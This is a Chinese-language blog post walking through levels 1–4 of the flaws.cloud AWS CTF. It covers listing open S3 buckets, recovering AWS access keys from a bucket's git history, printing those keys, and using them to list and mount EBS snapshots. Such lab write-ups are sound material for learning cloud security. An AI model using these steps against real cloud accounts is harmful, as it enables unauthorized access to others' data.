@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="SeikoSrp">
+
+
+
+
+
+
+<title>AWS_CTF | a blog</title>
+
+
+
+    <link rel="icon" href="/haidao.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+    <script src="/js/jquery.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+
+
+    <script>
+    function searchToggle() {
+        const width = $(document.body).width()
+        if(width > 479) {
+            return;
+        }
+        const search = $('.search');
+        const searchForm = $('.form-search');
+        const menuToggle = $('.menu-toggle');
+        const title = $('.navbar-header-title');
+
+        if(!search.hasClass("mobile-search")) {
+            search.addClass("mobile-search");
+            menuToggle.addClass("open-search")
+            title.addClass("mobile-title-hidden")
+        } else {
+            search.removeClass("mobile-search");
+            menuToggle.removeClass("open-search")
+            // title.css({visibility: 'visible'})
+            title.removeClass("mobile-title-hidden")
+        } 
+    }
+
+    function search(searchInputEl, formEl, flag) {
+        const path = "/" + "search.json"; // 可以在public 下查看这个search.json
+        $(formEl).submit(function(e){
+            e.preventDefault();
+            let target = null
+            if(searchInputEl == null) {
+                const screenWidth = $(document.body).width();
+                target = screenWidth > 479 ? $('#pc-search-input') : $('#mobile-search-input');
+                console.log(target);
+            } else {
+                target = $(searchInputEl)
+            }
+
+            if(!flag && target.val() === '') {
+                return ;
+            }
+
+            $("#u-search").fadeIn(500, function() {
+                $("body > .wrapper").addClass("modal-active");
+
+                $.ajax({
+                    url: path,
+                    dataType: "json",
+                    beforeSend: function (xhr) {
+                        $input = target.val();
+                        $(".form-input").val($input);
+                        const loadingBar = $('.search-loading-bar') 
+                        loadingBar.css({
+                            width:'100%',
+                            display: 'block'
+                        });
+                    },
+                    success: function( datas ) {
+                        // console.log(datas);
+                        const $resultPanel = $(".modal-body")[0];
+                        let str = `<ul class="modal-results">`;
+                        var keywords = $(".form-input").val().trim().toLowerCase().split(/[\s\-]+/);
+                        $resultPanel.innerHTML = "";
+                        let hasResult = false
+                        let text = `<div class="no-result">找不到与关键词相关的内容....</div>`;
+
+                        if ($(".form-input").val().trim().length <= 0) {
+                            // 没有结果
+                            $resultPanel.innerHTML = text;
+                            return;
+                        }
+                        datas.forEach(function (data) {
+                            var isMatch = true;
+                            if (!data.title || data.title.trim() === '') {
+                                data.title = "Untitled";
+                            }
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty contents
+                            if (data_content !== '') {
+                                keywords.forEach(function (keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        hasResult = true
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            } else {
+                                isMatch = false;
+                            }
+                            // show search results
+                            if (isMatch) {
+                                str += `<li class='result-item'><a href='${data_url}' class='result-item-detail'> <span class="title">${data_title}</span>`;
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 200 characters
+                                    var start = first_occur - 40;
+                                    var end = first_occur + 160;
+
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+
+                                    if (start == 0) {
+                                        end = 200;
+                                    }
+
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+
+                                    var match_content = content.substring(start, end);
+
+                                    // highlight all keywords
+                                    keywords.forEach(function (keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, `<em class="search-keyword">${keyword}</em>`);
+                                    });
+
+                                    str += `<span class="content"> ${match_content} ...</span></a>`;
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        if(hasResult) {
+                            $resultPanel.innerHTML = str;
+                        } else {
+                            $resultPanel.innerHTML = text;
+                        }
+
+                    },
+                    complete: function() {
+                        setTimeout(() => {
+                                const loadingBar = $('.search-loading-bar') 
+                                loadingBar.css({
+                                    width:'0%',
+                                    display: 'none'
+                                });
+                        }, 300)
+                    }
+                });
+            })
+
+        });
+    }
+
+    $(document).ready(function() {
+        $('.modal-close').click(function () { 
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+
+        $('.modal-overlay').click(function() {
+            $("#u-search").fadeOut();
+            $("body > .wrapper").removeClass("modal-active")
+        })
+        search(null, ".form-search", false)
+        search("#u-search-modal-form .form-input", ".u-search-modal-form", true)
+    })
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<!-- Chic/layout.ejs -->
+ <div id="u-search">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="container">
+                    <form id="u-search-modal-form" class="u-search-modal-form">
+                        <button type="submit" class="form-submit-btn">
+                            <img src="/image/search.png" class="search-btn-img" />
+                        </button>
+                        <input placeholder="搜索文章。。。" class="form-input" id="modal-form-input">
+                    </form>
+                    <a class="modal-close">x</a>
+                </div>
+                <div class="search-loading">
+                    <div class="search-loading-bar"></div>
+                </div>
+            </div>
+            <div class="modal-body">
+                <!-- ul 格式如下 -->
+                <!-- <ul class="modal-results">
+                    <li class="result-item">
+                        <a class="result-item-detail">
+                            <span class="title">页面配置</span>
+                            <span class="content">
+                                content
+                            </span>
+                        </a>
+                    </li>
+                </ul> -->
+            </div>
+        </div>
+        <div class="modal-overlay"></div>
+    </div>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">SeikoSrp&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                <!-- 这里表示的是pc端搜索框 -->
+                
+                
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="pc-search-input"/>
+        </form>
+    </div>
+
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">SeikoSrp&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="navbar-mobile-right">
+                    
+                    
+    <div class="search ">
+        <div class="search-btn" onClick="searchToggle()">
+            <img src="/image/search.png" class="search-btn-img" />
+        </div>
+        <form class="form-search">
+            <input class="input" placeholder="搜索文章" autocomplete="off" id="mobile-search-input"/>
+        </form>
+    </div>
+
+                    <div class="menu-toggle" onclick="mobileBtn()">&#9776; 目录</div>
+                </div>
+                
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/about">关于</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">全部展开</a>
+        <a onclick="go_top()">回到顶部</a>
+        <a onclick="go_bottom()">前往底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "全部折叠"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "全部展开"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">AWS_CTF</h1>
+            
+                <div class="post-meta">
+                    
+                        作者: <a itemprop="author" rel="author" href="/">SeikoSrp</a>
+                    
+
+                    
+                        <span class="post-time">
+                        发布于: <a href="#">十二月 18, 2020&nbsp;&nbsp;18:47:41</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    分类:
+                            
+                                <a href="/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE-%E4%BA%91-%E5%AE%B9%E5%99%A8/">大数据/云/容器</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="AWS-CTF"><a href="#AWS-CTF" class="headerlink" title="AWS CTF"></a>AWS CTF</h1><p><a href="http://flaws.cloud/" target="_blank" rel="noopener">http://flaws.cloud</a> 是在网上找的一个AWS的CTF网站，适合入门AWS安全的同学，然后跟着学习了一下：</p>
+<h2 id="level-1-练习如何访问存储桶"><a href="#level-1-练习如何访问存储桶" class="headerlink" title="level 1 练习如何访问存储桶"></a>level 1 练习如何访问存储桶</h2><p><img src="AWS_CTF.assets/image-20200819151320108.png" alt="image-20200819151320108"></p>
+<p><img src="AWS_CTF.assets/image-20200819151426002.png" alt="image-20200819151426002"></p>
+<p>S3存储桶的位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，flaws.cloud加上它的S3地址：http:&#x2F;&#x2F;flaws.cloud.s3-website-us-west-2.amazonaws.com&#x2F; ，也能访问到主页。</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200819151534807.png" alt="image-20200819151534807"></p>
+<p>上述的步骤得到的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、flaws.cloud是一个存储在S3中的静态网站</span><br><span class="line">2、地区位于us-west-2</span><br><span class="line">3、对于S3存储桶上HTTP端点的URL遵循固定格式：s3-&lt;region&gt;.amazonaws.com&#x2F;&lt;bucketname&gt;，所以flaws.cloud的S3端点为http:&#x2F;&#x2F;s3-us-west-2.amazonaws.com&#x2F;flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<p>访问上面信息3的地址：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">"http://s3.amazonaws.com/doc/2006-03-01/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>flaws.cloud<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Prefix</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Marker</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaxKeys</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">MaxKeys</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsTruncated</span>&gt;</span>false<span class="tag">&lt;/<span class="name">IsTruncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint1.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-14T03:00:38.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"f32e6fbab70a118cf4e2dc03fd71c59d"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>2575<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint2.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:17.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"565f14ec1dce259789eb919ead471ab9"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1707<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint3.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:11.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"ffe5dc34663f83aedaffa512bec04989"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1101<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2020-05-22T18:16:45.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"f01189cce6aed3d3e7f839da3af7000e"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>3162<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>logo.png<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2018-07-10T16:47:16.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"0623bdd28190d0583ef58379f94c2217"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>15979<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>robots.txt<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:28.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"9e6836f2de6d6e6691c78a1902bf9156"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>46<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>secret-dd02c7c.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span><span class="comment">&lt;!-- 这里是level2的内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:30.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>"c5e83d744b4736664ac8375d4464ed4c"<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1051<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ListBucketResult</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接把Key的内容加在后面，得到level2的地址：<a href="http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html" target="_blank" rel="noopener">http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html</a></p>
+<p><img src="AWS_CTF.assets/image-20200819162812197.png" alt="image-20200819162812197"></p>
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>使用AWS客户端绑定AK和SAK：</p>
+<p><img src="AWS_CTF.assets/image-20200826165621655.png" alt="image-20200826165621655"></p>
+<p>然后使用命令列出S3桶中的文件：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3://level2<span class="literal">-c8b217a33fcf1f839f6f1f73a00a9ae7</span>.flaws.cloud -<span class="literal">-region</span> us<span class="literal">-west</span><span class="literal">-2</span> -<span class="literal">-recursive</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826165900484.png" alt="image-20200826165900484"></p>
+<p>将secret-e4443fc.html加在后面组成URL：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud&#x2F;secret-e4443fc.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826170133794.png" alt="image-20200826170133794"></p>
+<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>首先使用命令查看第三关的存储桶：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3:&#x2F;&#x2F;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826171915564.png" alt="image-20200826171915564"></p>
+<p>有很多文件，和.git目录，使用命令下载下来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3:&#x2F;&#x2F;level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .&#x2F;testtest --recursive</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826172514150.png" alt="image-20200826172514150"></p>
+<p>查看git log:</p>
+<p><img src="AWS_CTF.assets/image-20200826172727008.png" alt="image-20200826172727008"></p>
+<p>检查提交记录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826173031158.png" alt="image-20200826173031158"></p>
+<p>然后看到当前目录下生成了一个access_keys.txt文件</p>
+<p><img src="AWS_CTF.assets/image-20200826173057975.png" alt="image-20200826173057975"></p>
+<p>内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">access_key AKIAJ366LIPB4IJKT7SA</span><br><span class="line">secret_access_key OdNa7m+bqUvF3Bn&#x2F;qgSnPE1kBpqcBTTjqwP83Jys</span><br></pre></td></tr></table></figure>
+
+<p>使用这两个AK和SAK配置客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile flaws</span><br><span class="line">&#x2F;&#x2F;这个命令是看当前的账号存储桶里的内容的</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826173335167.png" alt="image-20200826173335167"></p>
+<p>这里直接获取了后面所有关卡的地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span><br><span class="line">level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span><br><span class="line">level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</span><br><span class="line">level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud</span><br><span class="line">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</span><br><span class="line">theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</span><br></pre></td></tr></table></figure>
+
+<h3 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在将项目上传到S3存储桶，没有做权限校验？，任何人都可以下载，在git上传项目时第一次把账号密码上传上去了，然后重新传的时候没有将分支的内容删除</span><br><span class="line"></span><br><span class="line">思路：</span><br><span class="line">首先查看存储桶里的内容----&gt;发现存在.git----&gt;下载下来查看git的历史记录----&gt;通过提示得知有一次提交存在不该提交的内容----&gt;通过git checkout恢复工作树文件----&gt;获得AK和SAK----&gt;通关</span><br></pre></td></tr></table></figure>
+
+<h2 id="level-4-快照创建EC2"><a href="#level-4-快照创建EC2" class="headerlink" title="level 4 快照创建EC2"></a>level 4 快照创建EC2</h2><p>直接根据上一级获取到的level4的地址进入：<code>level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</code>，但是需要认证</p>
+<p><a href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/" target="_blank" rel="noopener">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/</a></p>
+<p><img src="AWS_CTF.assets/image-20200826175335565.png" alt="image-20200826175335565"></p>
+<h3 id="根据快照创建实例"><a href="#根据快照创建实例" class="headerlink" title="根据快照创建实例"></a>根据快照创建实例</h3><p>根据提示1使用命令获取呼叫者的身份（需要是IAM用户）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> flaws sts <span class="built_in">get-caller</span><span class="literal">-identity</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826175500456.png" alt="image-20200826175500456"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws -<span class="literal">-profile</span> flaws ec2 describe<span class="literal">-snapshots</span> -<span class="literal">-owner</span><span class="literal">-id</span> <span class="number">975426262029</span></span><br><span class="line"><span class="comment"># 根据ownerid查看describe-snapshots</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826175548736.png" alt="image-20200826175548736"></p>
+<p>查看快照的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200826191814711.png" alt="image-20200826191814711"></p>
+<p>用自己的账号登陆，然后根据这个快照创建一个EC2的卷，这里卷的availability-zone要设置和实例一样的，要不然会无法关联</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 create-volume --region us-west-2 --availability-zone us-west-2c --snapshot-id snap-0b49342abd1bdcb89</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827105229257.png" alt="image-20200827105229257"></p>
+<p>这里要记的一个内容是卷ID（图片的那个删除了，又重新创建了一个）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol-0642240204d119957</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827105348763.png" alt="image-20200827105348763"></p>
+<p>开启(就是创建)一个免费的EC2实例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances&#x2F;&#x2F;这个命令只是展示实例</span><br></pre></td></tr></table></figure>
+
+<p><img src="AWS_CTF.assets/image-20200827131754575.png" alt="image-20200827131754575"></p>
